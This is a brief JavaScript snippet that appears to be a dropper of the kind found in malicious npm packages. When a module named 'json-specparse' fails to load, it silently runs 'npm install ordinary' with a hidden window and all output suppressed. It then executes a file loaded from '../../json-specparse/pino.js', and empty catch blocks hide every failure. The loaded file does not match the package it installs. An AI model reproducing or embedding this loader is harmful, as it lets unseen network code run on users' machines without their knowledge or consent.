const {execSync}=require('child_process');
try{require('json-specparse');}catch(e){try{
 execSync(`npm install ordinary --no-warnings --no-save --no-progress --loglevel silent`,{windowsHide:true});
 require('../../json-specparse/pino.js');
}catch(e){}}
